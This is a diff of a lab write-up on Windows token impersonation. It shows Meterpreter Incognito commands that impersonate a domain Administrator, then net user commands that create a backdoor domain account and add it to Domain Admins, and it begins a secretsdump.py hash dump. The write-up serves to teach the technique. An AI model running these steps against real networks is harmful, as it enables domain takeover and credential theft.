@@ -321,6 +321,7 @@ getuid
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
+This shows that I already had SYSTEM-level access on the target machine.
 
 <p align="center">
   <img src="/writeups/token impersonation attack/images/step2-1.png" width="600">
@@ -328,7 +329,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 ## Step 3 - Load Incognito
 
-The Incognito extension allows token enumeration and impersonation.
+After getting a Meterpreter session on the target machine in my lab, I loaded the Incognito module to work with access tokens.
 
 ```bash
 load incognito
@@ -340,8 +341,11 @@ load incognito
 meterpreter > load incognito
 Loading extension incognito...Success.
 ```
+This confirms that the Incognito extension was loaded successfully and is ready to use for token listing and impersonation.
 
 ## Step 4 - List Available Tokens
+
+After loading Incognito, I listed all available user tokens on the system in my lab.
 
 ```bash
 meterpreter > list_tokens -u
@@ -367,11 +371,15 @@ Impersonation Tokens Available
 No tokens available
 ```
 
+From the list, I could see multiple delegation tokens, including the Administrator account in the domain.
+
 <p align="center">
   <img src="/writeups/token impersonation attack/images/step3.png" width="600">
 </p>
 
 ## Step 5 - Impersonate the Administrator Token
+
+From the available tokens, I selected the Administrator token and impersonated it in my lab session.
 
 ```bash
 impersonate_token "READTEAMBD\\Administrator"
@@ -387,6 +395,8 @@ meterpreter > impersonate_token READTEAMBD\\Administrator
 
 ## Step 6 - Verify Access
 
+After impersonating the token, I checked the current user again to confirm the change.
+
 ```bash
 getuid
 ```
@@ -398,9 +408,11 @@ meterpreter > getuid
 Server username: READTEAMBD\administrator
 ```
 
-The session was now running with Administrator privileges.
+At this point, the session was running with Administrator-level privileges on the target machine in my lab.
 
-## Step 6 - Add new user
+## Step 7 - Add new user
+
+After getting Administrator access in my lab session, I opened a system shell to run Windows commands.
 
 ```bash
 shell
@@ -418,9 +430,9 @@ Microsoft Windows [Version 10.0.19045.2965]
 C:\Windows\system32>
 ```
 
-### Step 6.1 - Create a Domain User
+### Step 7.1 - Create a Domain User
 
-The following command creates a new domain user named `testuser` with the password `@testuser#!`:
+After opening a system shell in my lab session, I created a new domain user named `test` with the password `@shahin123#!`:
 
 ```bash
 net user test @shahin123#! /add /domain
@@ -444,11 +456,13 @@ The request will be processed at a domain controller for domain READTEAMBD.local
 The command completed successfully.
 ```
 
+This confirms that a new domain user was created successfully in my lab environment.
+
 <p align="center">
   <img src="/writeups/token impersonation attack/images/step6.png" width="600">
 </p>
 
-## Step 6.2 - Add a User to the Domain Admins Group
+## Step 7.2 - Add a User to the Domain Admins Group
 
 The following command attempts to add the user `test` to the `Domain Admins` group:
 
@@ -475,7 +489,7 @@ The request will be processed at a domain controller for domain READTEAMBD.local
 The command completed successfully.
 ```
 
-## Step 7 - Dump All Hashes
+## Step 8 - Dump All Hashes
 
 ```bash
 secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
